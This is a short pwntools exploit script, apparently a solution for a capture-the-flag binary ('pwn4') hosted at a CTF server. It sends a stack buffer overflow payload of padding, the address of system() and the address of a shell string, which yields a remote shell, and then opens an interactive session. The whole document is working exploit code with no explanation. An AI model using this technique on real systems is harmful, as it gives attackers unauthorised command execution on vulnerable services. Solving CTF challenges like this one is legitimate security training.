from pwn import *


sh_string = p32(0x804a03d)
system_addr = p32(0x8048430)

#r = process("./pwn4")
r = remote("pwn.ctf.tamu.edu", 4324)
#gdb.attach(r, '''set follow-fork-mode child
#b * 0x08048778''')
payload = "A" * 32 +  system_addr + "JUNK" + sh_string
r.recvuntil("Input> ")
r.sendline(payload)
r.interactive()



